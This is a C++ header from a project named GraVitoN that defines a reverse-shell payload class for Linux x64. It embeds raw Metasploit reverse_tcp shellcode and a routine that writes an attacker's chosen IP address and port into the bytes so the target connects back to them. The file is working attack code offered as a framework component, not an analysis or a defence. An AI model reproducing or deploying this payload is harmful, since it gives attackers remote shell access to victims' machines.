/**
 * @file
 * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
 *
 * @section License
 *
 * This file is part of GraVitoN.
 *
 * Graviton is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Graviton is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Graviton.  If not, see http://www.gnu.org/licenses/.
 *
 * @brief Payload_Linux64r
 *
*/

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
#ifndef _GVN_PAYLOAD_LINUX64R_HEAD_
#define _GVN_PAYLOAD_LINUX64R_HEAD_

#include <payload/payload.hpp>

#include <cstdio>
#include <cstdlib>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <unistd.h>

namespace GraVitoN
{

namespace Payload
{

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
/**
 * @brief A reverse shell for linux x64
 *
 */
class Linux_MSF_Shell_Reverse_64 : public GraVitoN::Payload::Binary_Payload
{
private:
    string host;
    unsigned int port;

protected:
	virtual bool initPayload();

public:
	/// Constructor
    Linux_MSF_Shell_Reverse_64();

	/// Destructor
    virtual ~Linux_MSF_Shell_Reverse_64();

	/**
	 * @brief Initialize
	 *
	 * @param [in] _options
	 *
	 * @options
     * port: reverse bind port, remote_host: msf server
	 *
	 */
    virtual bool initialize ( const string &remote_host, const unsigned int &remote_port);
};

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
Linux_MSF_Shell_Reverse_64::Linux_MSF_Shell_Reverse_64()
{
    jumper = _null_;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
Linux_MSF_Shell_Reverse_64::~Linux_MSF_Shell_Reverse_64()
{
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Linux_MSF_Shell_Reverse_64::initPayload()
{	
	/*
	 * linux/x64/shell/reverse_tcp - 68 bytes (stage 1)
	 * http://www.metasploit.com
	 * VERBOSE=false, LHOST=192.168.56.1, LPORT=7357,
	 * ReverseConnectRetries=5, ReverseAllowProxy=false,
	 * PrependSetresuid=false, PrependSetreuid=false,
	 * PrependSetuid=false, PrependChrootBreak=false,
	 * AppendExit=false, InitialAutoRunScript=, AutoRunScript=
	 */
	unsigned char buf[] =
	"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
	"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x56\x50\x6a\x29\x58\x99\x6a"
	"\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00\x1c\xbd"
	"\xc0\xa8\x38\x01\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f"
	"\x05\x59\x5e\x5a\x0f\x05\xff\xe6";
	/*
	 * "\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
	 * "\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x56\x50\x6a\x29\x58\x99\x6a"
	 * "\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00\x[LPORT:2]"
	 * "\x[LHOST:4]\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f"
	 * "\x05\x59\x5e\x5a\x0f\x05\xff\xe6";
	 */
	int buf_len = 68;
	
	/// Change port number
	unsigned char up = port / 256, down = port % 256;
	unsigned int ip[4];
	buf[43] = up;
	buf[44] = down;
	sscanf(host.c_str(), "%d.%d.%d.%d", &ip[0], &ip[1], &ip[2], &ip[3]);
	for(int i=0; i<4; ++i)
		buf[45+i] = (unsigned char)ip[i];
	
    payload_size = buf_len;
    payload = new unsigned char[payload_size];
    memcpy ( payload, buf, payload_size * sizeof ( unsigned char ) );

    return true;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Linux_MSF_Shell_Reverse_64::initialize (const string &remote_host, const unsigned int &remote_port)
{
    host = remote_host;
    port = remote_port;

    Core::Logger::logIt ( "init payload... " );
    initPayload();
    Core::Logger::logItLn ( "done" );

    return true;
}

}
}
#endif // _GVN_PAYLOAD_LINUX64R_HEAD_
